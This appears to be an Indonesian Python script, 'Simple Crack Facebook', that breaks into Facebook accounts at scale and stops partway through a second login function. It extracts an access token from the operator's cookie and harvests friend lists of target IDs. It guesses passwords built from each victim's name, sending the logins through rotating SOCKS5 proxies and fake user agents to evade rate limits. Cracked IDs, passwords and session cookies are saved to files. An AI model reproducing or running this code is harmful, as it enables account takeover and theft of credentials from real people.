#-----------------[ IMPORT-MODULE ]-------------------
import requests,bs4,json,os,sys,random,datetime,time,re
import urllib3,rich,base64
from rich.table import Table as me
from rich.console import Console as sol
from bs4 import BeautifulSoup as sop
from concurrent.futures import ThreadPoolExecutor as tred
from rich.console import Group as gp
from rich.panel import Panel as nel
from rich import print as cetak
from rich.panel import Panel
from rich.tree import Tree
from rich.markdown import Markdown as mark
from rich.columns import Columns as col
from rich import print as rprint
from rich import pretty
from rich.text import Text as tekz
from rich.progress import Progress,SpinnerColumn,BarColumn,TextColumn,TimeElapsedColumn
pretty.install()
CON=sol()
#------------------[ USER-AGENT ]-------------------#
pretty.install()
CON=sol()
ugen2=[]
ugen=[]
cokbrut=[]
ses=requests.Session()
princp=[]
prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks5&timeout=100000&country=all&ssl=all&anonymity=all').text
open('.prox.txt','w').write(prox)
prox=open('.prox.txt','r').read().splitlines()


for xd in range(10000):
    a='Mozilla/5.0 (Linux; Android 12;'
    b=random.randrange(1, 9)
    c=random.randrange(1, 9)
    d='SAMSUNG SM-G986U)'
    e=random.randrange(100, 9999)
    f='AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/17.0 Chrome/96.0.4664.104'
    g=random.randrange(1, 9)
    h=random.randrange(1, 4)
    i=random.randrange(1, 4)
    j=random.randrange(1, 4)
    k='Mobile Safari/537.36'
    uaku=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
    ugen2.append(uaku)
	
    rr = random.randint
    rc = random.choice
    a = ['2.3.6;','4.0.4;','4.2.1;','4.2.2;','4.3;','4.4.2;','4.4.4;','5.0;','5.0.2;','5.1;','5.1.1;','6.0;','6;','6.0.1;','7.0;','7.0.1;','7;','8;','8.0;','8.0.1;','9;','10;','11;','12;']
    b = ['zh-cn;','en-us;','id-id;','en-gb;','ru-ru;','jap-jap;','en-ca;','es-mx;','zh-tw;','ko-kr;','th-th;','en-in;','el-gr;','tr-tr;','fr-fr;','en-ez;','zh-hk;','ar-ae;','ru-ru;','zh-CN;en-US;','fr-ch;','pt-br;','nl-nl;']
    c = ['QP1A','RKQ1','PPR1','QKQ1','KOT49H','JSS15J']
    az = ['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z']
    a1 = f'Mozilla/5.0 (Linux; Android {str(rc(a))} {str(rc(b))} {str(rc(az))} {str(rc(az))}{str(rr(1000,9999))}{str(rc(az))} SAMSUNG SM-A307FN){str(rc(c))}.{str(rr(100000,999999))}.AppleWebKit/{str(rr(111,999))}.{str(rr(1,999))} (KHTML, like Gecko) SamsungBrowser/10.2 Chrome/{str(rr(10,999))}.0.{str(rr(1000,9999))}.{str(rr(10,999))} Mobile Safari/{str(rr(111,999))}.{str(rr(1,999))}'
    a2 = f'Mozilla/5.0 (Linux; U; Android {str(rc(a))} {str(rc(b))} CPH{str(rr(1000,9999))}) Build/{str(rc(c))}.{str(rr(100000,999999))}.020; wv) AppleWebKit/{str(rr(111,999))}.{str(rr(1,999))} (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(10,999))}.0.{str(rr(1000,9999))}.{str(rr(10,999))} Mobile Safari/{str(rr(111,999))}.{str(rr(1,999))}'
    a3 = f'Mozilla/5.0 (Linux; U; Android {str(rc(a))} {str(rc(b))} SAMSUNG GT-{str(rc(az))}{str(rr(1000,9999))}{str(rc(az))}) Build/GINGERBREAD) AppleWebKit/{str(rr(111,999))}.{str(rr(1,999))} (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(10,999))}.0.{str(rr(1000,9999))}.{str(rr(10,999))} Mobile Safari/{str(rr(111,999))}.{str(rr(1,999))}'
    a4 = f'Mozilla/5.0 (Linux; U; Android {str(rc(a))} {str(rc(b))} RMX{str(rr(1000,9999))}) Build/{str(rc(c))}.{str(rr(100000,999999))}.020; wv) AppleWebKit/{str(rr(111,999))}.{str(rr(1,999))} (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(10,999))}.0.{str(rr(1000,9999))}.{str(rr(10,999))} Mobile Safari/{str(rr(111,999))}.{str(rr(1,999))}'
    a5 = f'Mozilla/5.0 (Linux; U; Android {str(rc(a))} {str(rc(b))} Redmi {str(rr(3,10))}{str(rc(az))} Build/{str(rc(c))}.{str(rr(100000,999999))}.011; wv) AppleWebKit/{str(rr(111,999))}.{str(rr(1,999))} (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(10,999))}.0.{str(rr(1000,9999))}.{str(rr(10,999))} Mobile Safari/{str(rr(111,999))}.{str(rr(1,999))}'
    a6 = f'Mozilla/5.0 (Linux; U; Android {str(rc(a))} {str(rc(b))} {str(rr(1000000,9999999))}) Build/{str(rc(c))}.{str(rr(100000,999999))}.001; wv) AppleWebKit/{str(rr(111,999))}.{str(rr(1,999))} (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(10,999))}.0.{str(rr(1000,9999))}.{str(rr(10,999))} Mobile Safari/{str(rr(111,999))}.{str(rr(1,999))}'
    a7 = f'Mozilla/5.0 (Linux; U; Android {str(rc(a))} {str(rc(b))} XQ- {str(rc(az))}{str(rc(az))}{str(rr(11,999))} Build/{str(rc(c))}.{str(rr(100000,999999))}.020; wv) AppleWebKit/{str(rr(111,999))}.{str(rr(1,999))} (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(10,999))}.0.{str(rr(1000,9999))}.{str(rr(10,999))} Mobile Safari/{str(rr(111,999))}.{str(rr(1,999))}'
    a8 = f'Mozilla/5.0 (Linux; U; Android {str(rc(a))} {str(rc(b))} ASUS{str(rc(az))}00{str(rc(az))}) Build/{str(rc(c))}.{str(rr(100000,999999))}.020; wv) AppleWebKit/{str(rr(111,999))}.{str(rr(1,999))} (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(10,999))}.0.{str(rr(1000,9999))}.{str(rr(10,999))} Mobile Safari/{str(rr(111,999))}.{str(rr(1,999))}'
    uaku2 =f'{a5}'
    ugen.append(uaku2)
for x in range(10):
	a='Mozilla/5.0 (SAMSUNG; SAMSUNG-GT-S'
	b=random.randrange(100, 9999)
	c=random.randrange(100, 9999)
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	h=random.randrange(1, 9)
	i='; U; Bada/1.2; en-us) AppleWebKit/533.1 (KHTML, like Gecko) Dolfin/'
	j=random.randrange(1, 9)
	k=random.randrange(1, 9)
	l='Mobile WVGA SMM-MMS/1.2.0 OPN-B'
	uak=f'{a}{b}/{c}{d}{e}{f}{g}{h}{i}{j}.{k} {l}'


def uaku():
	try:
		ua=open('ua.txt','r').read().splitlines()
		for ub in ua:
			ugen.append(ub)
	except:
		a=requests.get('https://raw.githubusercontent.com/AKING110/User-Agent/main/ua.txt').text
		ua=open('.ua.txt','w')
		aa=re.findall('line">(.*?)<',str(a))
		for un in aa:
			ua.write(un+'\n')
		ua=open('.ua.txt','r').read().splitlines()
#------------[ INDICATION ]---------------#
id,id2,loop,ok,cp,akun,oprek,method,lisensiku,taplikasi,tokenku,uid,lisensikuni= [],[],0,0,0,[],[],[],[],[],[],[],[]
cokbrut=[]
pwpluss,pwnya=[],[]
#------------[ WARNA ]--------------#
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m' 
O = '\x1b[1;96m'
N = '\x1b[0m'    
Z = "\033[1;30m"
sir = '\033[41m\033[93m'
x = '\33[m' # DEFAULT
m = '\x1b[1;91m' #RED +
k = '\033[93m' # KUNING +
h = '\x1b[1;92m' # HIJAU +
hh = '\033[32m' # HIJAU -
u = '\033[95m' # UNGU
kk = '\033[33m' # KUNING -
b = '\33[1;96m' # BIRU -
p = '\x1b[0;34m' # BIRU +
asu = random.choice([Z,N,O,U,B,K,H,M,P])
sir =random.choice([M])
#--------------------[ CONVERTER-BULAN ]--------------#
dic = {'1':'January','2':'February','3':'March','4':'April','5':'May','6':'June','7':'July','8':'August','9':'September','10':'October','11':'November','12':'December'}
dic2 = {'01':'January','02':'February','03':'March','04':'April','05':'May','06':'June','07':'July','08':'August','09':'September','10':'October','11':'November','12':'Devember'}
tgl = datetime.datetime.now().day
bln = dic[(str(datetime.datetime.now().month))]
thn = datetime.datetime.now().year
okc = 'OK-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
cpc = 'CP-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
#------------------[ MACHINE-SUPPORT ]---------------#
def renv_xy(u):
        for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.005)
def clear():
	os.system('clear')
def back():
	login()
#------------------[ LOGO-BANNER ]-----------------#
def banner():
	
	print(f"""{asu}
Simple Crack Facebook\n(+) Made By {M}Indonesian {P}Coder
{m} ☯︎ {k} ☯︎ {h} ☯︎ {sir}Recode : SidikGanz{x}{m} ☯︎ {k} ☯︎ {h} ☯︎
	{asu}""")
#--------------------[ BAGIAN-MASUK ]--------------#
def login():
 try:
  token = open('.token.txt','r').read()
  cok = open('.cok.txt','r').read()
  tokenku.append(token)
  try:
   sy = requests.get('https://graph.facebook.com/me?fields=id,name&access_token='+tokenku[0], cookies={'cookie':cok})
   sy2 = json.loads(sy.text)['name']
   sy3 = json.loads(sy.text)['id']
   menu(sy2,sy3)
  except KeyError:
   login_lagi334()
  except requests.exceptions.ConnectionError:
   li = '# KALO GAK ADA KUOTA MENDING TURU ATAU HOSPOT KE TEMEN LU!!! '
   lo = mark(li, style='red')
   sol().print(lo, style='cyan')
   exit()
 except IOError:
  login_lagi334()
def login_lagi334():
 try:
  os.system('clear')
  banner()
  cetak(nel('\t Masukkan : [green]Cookiedough[white]'))
  asu = random.choice([m,k,h,b,u])
  cookie=input(f'Masukkan Cookies :{asu} ')
  data = requests.get("https://business.facebook.com/business_locations", headers = {"user-agent": "NokiaX3-02/5.0 (06.05) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+","referer": "https://www.facebook.com/","host": "business.facebook.com","origin": "https://business.facebook.com","upgrade-insecure-requests" : "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7","cache-control": "max-age=0","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8","content-type":"text/html; charset=utf-8"}, cookies = {"cookie":cookie}) 
  find_token = re.search("(EAAG\w+)", data.text)
  ken=open(".token.txt", "w").write(find_token.group(1))
  cok=open(".cok.txt", "w").write(cookie)
  print(f'  {x}[{h}•{x}]{h} LOGIN BERHASIL {x} ');time.sleep(1)
  exit()
 except Exception as e:
  os.system("rm -f .token.txt")
  os.system("rm -f .cok.txt")
  print(f'  %s[%sx%s]%s LOGIN GAGAL !!%s'%(x,k,x,m,x))
  exit()
#------------------[ BAGIAN-MENU ]----------------#
def menu(my_name,my_id):
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
	except IOError:
		print('[×] Expired Cookies ')
		time.sleep(5)
		login_lagi334()
	os.system('clear')
	banner()
	print('')
	ip = requests.get("https://api.ipify.org").text
	renv_xy(f'>> Your Id	 : '+str(my_id))
	renv_xy(f'>> Your Ip	 : {ip}')
	print(f'>> {p}F{x}acebook      :{U} Akhmad Sidik{asu}')
	print(f'>> Pengembang    : SidikXD{x} ')
	print('')
	print(f'>> {b}Select Menu')
	print('')
	print('1. Creck Id Publik')
	print('2. Hasil Crack ')
	print('0. Exit')
	_____renv__renv_____ = input('\n>> Select : ')
	print('')
	if _____renv__renv_____ in ['1']:
		dump_massal()
	elif _____renv__renv_____ in ['2']:
		result()
	elif _____renv__renv_____ in ['0']:
		os.system('rm -rf .token.txt')
		os.system('rm -rf .cookie.txt')
		print('>> Successfully Logout+Delete Cookies ')
		exit()
	else:
		print('>> input correctly ')
		back()
def error():
	print(f'{k}>> Sorry, this feature is still being fixed {x}')
	time.sleep(4)
	back()
#-----------------[ HASIL-CRACK ]-----------------#
def result():
	print('➪ 1.Hasil CP Anda ')
	print('➪ 2.Hasil OK Anda ')
	print('➪ 0.Kembali	')
	kz = input('\n➪ Pilih : ')
	if kz in ['1','01']:
		try:vin = os.listdir('CP')
		except FileNotFoundError:
			print('➪ Filemu kagak ada ngen ')
			time.sleep(3)
			back()
		if len(vin)==0:
			print('➪ Anda Tidak Memiliki Hasil CP ')
			time.sleep(2)
			back()
		else:
			cih = 0
			lol = {}
			for isi in vin:
				try:hem = open('CP/'+isi,'r').readlines()
				except:continue
				cih+=1
				if cih<10:
					nom = '0'+str(cih)
					lol.update({str(cih):str(isi)})
					lol.update({nom:str(isi)})
					print('['+nom+'] '+isi+' [ '+str(len(hem))+' Account ]'+x)
				else:
					lol.update({str(cih):str(isi)})
					print('['+str(cih)+'] '+isi+' [ '+str(len(hem))+' Account ]'+x)
			geeh = input('\n>> Pilih : ')
			try:geh = lol[geeh]
			except KeyError:
				print('>> Pilih Yang Bener Kontol ')
				exit()
			try:lin = open('CP/'+geh,'r').read().splitlines()
			except:
				print('>> File Tidak Di Temukan ')
				time.sleep(2)
				back()
			nocp=0
			for cpku in range(len(lin)):
				cpkuni=lin[nocp].split('|')
				cpkuh=f'# ID : {cpkuni[0]} PASSWORD : {cpkuni[1]}'
				sol().print(mark(cpkuh,style="yellow"))
				nocp +=1
			input('[ Klik Enter ]')
			back()
	elif kz in ['2','02']:
		try:vin = os.listdir('OK')
		except FileNotFoundError:
			print('>> File Tidak Di Temukan ')
			time.sleep(2)
			back()
		if len(vin)==0:
			print('>> Anda Tidak Mempunyai File OK ')
			time.sleep(2)
			back()
		else:
			cih = 0
			lol = {}
			for isi in vin:
				try:hem = open('OK/'+isi,'r').readlines()
				except:continue
				cih+=1
				if cih<100:
					nom = '0'+str(cih)
					lol.update({str(cih):str(isi)})
					lol.update({nom:str(isi)})
					print('['+nom+'] '+isi+' [ '+str(len(hem))+' Account ]'+x)
				else:
					lol.update({str(cih):str(isi)})
					print('['+str(cih)+'] '+isi+' [ '+str(len(hem))+' Account ]'+x)
			geeh = input('\n>> Pilih : ')
			try:geh = lol[geeh]
			except KeyError:
				print('>> Pilih Yang Bener Kontol ')
				exit()
			try:lin = open('OK/'+geh,'r').read().splitlines()
			except:
				print('>> File Tidak Di Temukan ')
				time.sleep(2)
				back()
			nocp=0
			for cpku in range(len(lin)):
				cpkuni=lin[nocp].split('|')
				cpkuh=f'# ID : {cpkuni[0]} PASSWORD : {cpkuni[1]}'
				sol().print(mark(cpkuh,style="green"))
				print(f'{hh}COOKIE : {x}{cpkuni[2]}')
				nocp +=1
			input('[ Klik Enter ]')
			back()
	elif kz in ['0','00']:
		back()
	else:
		print('>> Pilih Yang Bener Kontol ')
		exit()
#-------------------[ CRACK-PUBLIK ]----------------#
def dump_massal():
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
	except IOError:
		exit()
	try:
		jum = int(input('>> mau brapa target ngab ? : '))
	except ValueError:
		print('>> wrong input ')
		exit()
	if jum<1 or jum>100:
		print('>> Failed Dump Id maybe id is not public ')
		exit()
	ses=requests.Session()
	yz = 0
	for met in range(jum):
		yz+=1
		kl = input('Enter the Id '+str(yz)+' : ')
		uid.append(kl)
	for userr in uid:
		try:
			col = ses.get('https://graph.facebook.com/v2.0/'+userr+'?fields=friends.limit(5000)&access_token='+tokenku[0], cookies = {'cookies':cok}).json()
			for mi in col['friends']['data']:
				try:
					iso = (mi['id']+'|'+mi['name'])
					if iso in id:pass
					else:id.append(iso)
				except:continue
		except (KeyError,IOError):
			pass
		except requests.exceptions.ConnectionError:
			print('>> unstable signal ')
			exit()
	try:
		print('')
		print(f'Total Id Collected {h}'+str(len(id)))
		setting()
	except requests.exceptions.ConnectionError:
		print(f'{x}')
		print('>> unstable signal ')
		back()
	except (KeyError,IOError):
		print(f'>>{k} Friendship Not Public {x}')
		time.sleep(3)
		back()
#-------------[ PENGATURAN-IDZ ]---------------#
def setting():
	print(f'\n{x}>> ID Order Setting ')
	print('')
	print(f'{x}1. Id Old To New ({M}Not Recommend{M}{x}){x} ')
	print(f'2. Id New To Old ({H}Recommended{H}{x}){x}  ')
	print(f'3. Id Random ({K}Very Recommended{K}{x}){x} ')
	print('')
	hu = input('Select : ')
	if hu in ['1','01']:
		for tua in sorted(id):
			id2.append(tua)
			
	elif hu in ['2','02']:
		muda=[]
		for bacot in sorted(id):
			muda.append(bacot)
		bcm=len(muda)
		bcmi=(bcm-1)
		for xmud in range(bcm):
			id2.append(muda[bcmi])
			bcmi -=1
	elif hu in ['3','03']:
		for bacot in id:
			xx = random.randint(0,len(id2))
			id2.insert(xx,bacot)
	else:
		print('>> input correctly ')
		exit()
		print('')
		
	print('\n>> Input Metode URL Login ')
	print('')
	print(f'1. login from {H}m.facebook.com{x} (RECOMEND)')
	print(f'2. login from {M}free.facebook.com{x} (NOT RECOMEND)')
	print(f'3. login from {K}mbasic.facebook.com{x} (MODE LEMON)')
	print('')
	hc = input('>> Pilih : ')
	if hc in ['1','01']:
		method.append('mobile')
	elif hc in ['2','02']:
		method.append('free')
	elif hc in ['3','03']:
		method.append('mbasic')
	else:
		method.append('mobile')
	print('')
	pwplus=input('>> Add Password Manual ( Y/t ) ')
	print('')
	if pwplus in ['y','Y']:
		pwpluss.append('ya')
		cetak('Enter an additional password of at least 6 characters\nExample :[green] Indonesia,rahasia,katasandi[white] ')
		pwku=input('Enter Additional Password : ')
		pwkuh=pwku.split(',')
		for xpw in pwkuh:
			pwnya.append(xpw)
	else:
		pwpluss.append('no')
	passwrd()
#-------------------[ BAGIAN-WORDLIST ]------------#
def passwrd():
	print('')
	print(f'>> Results {h}OK{x} Save in : {h}OK/%s {x}'%(okc))
	print(f'>> Results {k}CP{x} Save in : {k}CP/%s {x}'%(cpc))
	print(f'>> Play Airplane Mode Every 500 ID\n')
	with tred(max_workers=30) as pool:
		for yuzong in id2:
			idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
			frs = nmf.split(' ')[0]
			pwv = []
			if len(nmf)<6:
				if len(frs)<3:
					pass
				else:
					pwv.append(nmf)
					pwv.append(frs+'123456')
					pwv.append(frs+'12345')
					pwv.append(frs+'1234')
					pwv.append(frs+'321')
					pwv.append(frs+'123')
			else:
				if len(frs)<3:
					pwv.append(nmf)
				else:
					pwv.append(nmf)
					pwv.append(frs+'123456')
					pwv.append(frs+'12345')
					pwv.append(frs+'1234')
					pwv.append(frs+'321')
					pwv.append(frs+'123')
			if 'ya' in pwpluss:
				for xpwd in pwnya:
					pwv.append(xpwd)
			else:pass
			if 'mobile' in method:
				pool.submit(crack,idf,pwv)
			elif 'free' in method:
				pool.submit(crackfree,idf,pwv)
			elif 'mbasic' in method:
				pool.submit(crackmbasic,idf,pwv)
			else:
				pool.submit(crackmbasic,idf,pwv)
	print('')
	cetak('\t[cyan]>>[green] Succesfully Crack,Dont Forget Send Your Feedback After Use My Script [cyan] <<[white] ')
	print('')
	print(f'{h} OK : {h}%s '%(ok))
	print(f'{k} CP : {k}%s{x} '%(cp))
	print('')
	print(f'\t{x}>>{k} KALO MAU DAPET BANYAK GANTENG DULU GAK GANTENG GAK IJO {x} << ')
#--------------------[ METODE-API ]-----------------#
def crack(idf,pwv):
	global loop,ok,cp
	bo = random.choice([m,k,h,b,u,x])
	pers = loop*100/len(id2)
	fff = '%'
	print('\r%s%s/%s ok:%s/cp:%s %s%s%s'%(bo,loop,len(id2),ok,cp,int(pers),str(fff),x), end=' ');sys.stdout.flush()
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	for pw in pwv:
		try:
			nip=random.choice(prox)
			proxs= {'http': 'socks5://'+nip}
			ses.headers.update({'Host': 'm.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
			p = ses.get('https://web.facebook.com/?stype=lo&jlou=AfcC0nVHkaKnsZ5xwvpzaAYMYkG14PaZSuSQgfMqhT6oOd_laGAG-DcO9eVw2Gv4nHKGB5WUOrsZ2MyMfAxy5onjpw3SjdoyqwSFbDs3dC8jdg&smuh=40891&lh=Ac8_n77eoAFbSwMGYlA')
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://web.facebook.com/whitehat/fbdl/?_rdc=1&_rdr","flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={'Host': 'm.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://m.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://web.facebook.com/?stype=lo&jlou=AfcC0nVHkaKnsZ5xwvpzaAYMYkG14PaZSuSQgfMqhT6oOd_laGAG-DcO9eVw2Gv4nHKGB5WUOrsZ2MyMfAxy5onjpw3SjdoyqwSFbDs3dC8jdg&smuh=40891&lh=Ac8_n77eoAFbSwMGYlA','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
			po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
			if "checkpoint" in po.cookies.get_dict().keys():
				print(f'\r{x} └──> {x}{K}{idf}|{pw}')
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				print(f'\r{x} └──> {H}{idf}|{pw}')
				print(f'\r{x} └──> {x}{H}{kuki}{H}')
				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
			
				cek_apk(session,coki)
				break
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1
#------------------[ METHODE-FREE-FB ]-------------------#
def crackfree(idf,pwv):
	global loop,ok,cp
	bo = random.choice([m,k,h,b,u,x])
	pers = loop*100/len(id2)
	fff = '%'
	print('\r%s%s/%s ok:%s/cp:%s %s%s%s'%(bo,loop,len(id2),ok,cp,int(pers),str(fff),x), end=' ');sys.stdout.flush()
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	for pw in pwv:
		try:
			nip=random.choice(prox)
			proxs= {'http': 'socks5://'+nip}
			ses.headers.update({'Host': 'free.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
			p = ses.get('https://free.facebook.com/login.php?skip_api_login=1&api_key=113869198637480&kid_directed_site=0&app_id=113869198637480&signed_next=1&next=https%3A%2F%2Ffree.facebook.com%2Fv14.0%2Fdialog%2Foauth%3Fapp_id%3D113869198637480%26auth_type%26cbt%3D1661472092987%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df105a73f6454cdc%2526domain%253Ddevelopers.facebook.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fdevelopers.facebook.com%25252Ff3156f6746429d4%2526relation%253Dopener%26client_id%3D113869198637480%26display%3Dtouch%26domain%3Ddevelopers.facebook.com%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Fdevelopers.facebook.com%252Fdocs%252Ffacebook-login%252Fweb%252Flogin-button%26force_confirmation%3Dfalse%26id%3Df645772e438a8%26locale%3Did_ID%26logger_id%3D156a3104-7770-45c9-a62a-bff441a03e49%26messenger_page_id%26origin%3D2%26plugin_prepare%3Dtrue%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df2ce1f45a7b6fdc%2526domain%253Ddevelopers.facebook.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fdevelopers.facebook.com%25252Ff3156f6746429d4%2526relation%253Dopener.parent%2526frame%253Df645772e438a8%26ref%3DLoginButton%26reset_messenger_state%3Dfalse%26response_type%3Dsigned_request%252Ctoken%252Cgraph_domain%26scope%26sdk%3Djoey%26size%3D%257B%2522width%2522%253Anull%252C%2522height%2522%253Anull%257D%26tp_config_id%26url%3Ddialog%252Foauth%26version%3Dv14.0%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df2ce1f45a7b6fdc%26domain%3Ddevelopers.facebook.com%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fdevelopers.facebook.com%252Ff3156f6746429d4%26relation%3Dopener.parent%26frame%3Df645772e438a8%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&rtime=1661472095&hrc=1&_rdr')
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://free.facebook.com/v14.0/dialog/oauth?app_id=113869198637480&auth_type&cbt=1661472092987&channel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df105a73f6454cdc%26domain%3Ddevelopers.facebook.com%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fdevelopers.facebook.com%252Ff3156f6746429d4%26relation%3Dopener&client_id=113869198637480&display=touch&domain=developers.facebook.com&e2e=%7B%7D&fallback_redirect_uri=https%3A%2F%2Fdevelopers.facebook.com%2Fdocs%2Ffacebook-login%2Fweb%2Flogin-button&force_confirmation=false&id=f645772e438a8&locale=id_ID&logger_id=156a3104-7770-45c9-a62a-bff441a03e49&messenger_page_id&origin=2&plugin_prepare=true&redirect_uri=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df2ce1f45a7b6fdc%26domain%3Ddevelopers.facebook.com%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fdevelopers.facebook.com%252Ff3156f6746429d4%26relation%3Dopener.parent%26frame%3Df645772e438a8&ref=LoginButton&reset_messenger_state=false&response_type=signed_request%2Ctoken%2Cgraph_domain&scope&sdk=joey&size=%7B%22width%22%3Anull%2C%22height%22%3Anull%7D&tp_config_id&url=dialog%2Foauth&version=v14.0&ret=login&fbapp_pres=0&tp=unspecified","flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
